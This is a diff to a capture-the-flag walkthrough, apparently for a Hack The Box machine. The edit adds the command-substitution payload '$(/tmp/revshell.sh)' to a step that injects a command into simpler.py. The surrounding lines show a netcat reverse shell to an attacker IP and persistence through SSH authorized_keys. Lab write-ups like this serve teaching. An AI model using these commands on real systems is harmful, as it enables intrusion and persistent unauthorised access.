@@ -445,7 +445,7 @@ echo 'nc 10.10.15.147 7600 -e /bin/bash' > /tmp/revshell.sh
 chmod +x /tmp/revshell.sh
 ```
 
-So breaking this down, we create the shell script containing the netcat reverse shell, and make it executable with `chmod +x`. When we run `simpler.py` again, we simply feed it the command to run the script. This gives us our reverse shell back.
+So breaking this down, we create the shell script containing the netcat reverse shell, and make it executable with `chmod +x`. When we run `simpler.py` again, we simply feed it the command to run the script, which is `$(/tmp/revshell.sh)`. This gives us our reverse shell back.
 
 From here, we're running as `pepper`, so we can simply add our own SSH Public keys to `/home/pepper/.ssh/authorized_keys` to gain SSH access with `ssh pepper@10.10.10.143`.
 
